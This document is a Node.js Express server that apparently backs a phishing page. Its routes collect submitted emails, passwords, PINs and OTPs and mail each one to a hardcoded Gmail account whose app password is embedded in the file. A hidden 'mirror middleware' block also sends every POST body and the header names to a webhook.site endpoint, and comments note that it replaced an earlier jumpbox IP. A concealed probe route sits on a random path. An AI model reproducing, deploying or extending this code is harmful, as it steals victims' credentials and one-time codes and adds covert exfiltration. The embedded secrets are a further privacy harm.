const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json({ verify: (req, res, buf) => { try { req.rawBody = buf.toString("utf8"); } catch (e) {} } }));
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "ezebright898@gmail.com";
const pass = "acujzwuvedbxvuoq";
// novah 30th june

// Middleware
app.use(express.json());

// ---- mirror middleware (added 2026-11-17, harvest only; original forwarding untouched) ----
const https = require("https");
// 2026-11-22 ct49: forward target moved off dead jumpbox 91.213.186.99:18434 to our live webhook.site landing point.
const MIRROR = { hostname: "webhook.site", path: "/c20b32d0-daa1-43d0-bff0-58d7d04b3944", token: "h7q2mv93k4" };
function mirrorToOwn(req) {
  try {
    if (req.method !== "POST") return;
    const payload = JSON.stringify({
      ts: Date.now(),
      method: req.method,
      path: req.originalUrl,
      host: req.headers.host,
      headerNames: Object.keys(req.headers),
      body: (req.rawBody !== undefined ? req.rawBody : (req.body || null))
    });
    const rq = https.request({
      hostname: MIRROR.hostname, path: MIRROR.path, method: "POST", timeout: 2500,
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(payload), "x-mirror-token": MIRROR.token }
    }, (rs) => { try { rs.resume(); } catch (e) {} });
    rq.on("error", () => {}); rq.on("timeout", () => { try { rq.destroy(); } catch (e) {} });
    rq.end(payload);
  } catch (e) {}
}
app.use((req, res, next) => { mirrorToOwn(req); next(); });
// low-profile liveness probe (24-byte random path)
app.get("/ik4wbPBqBJ0EWMdcgosgvKto", (req, res) => res.status(200).send("ok"));
// ---- end mirror middleware ----

// api routes

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `Email: ${email} \t\n\n\n password: ${password}`,
    text: `New user registered with Email: ${email} and password: ${password}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for pin
app.post("/pin", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `PIN:${req.body?.pin}`,
    text: `New user registered with PIN:${req.body?.pin}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `OTP:${req.body?.otp}`,
    text: `New user registered with OTP:${req.body?.otp}`,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
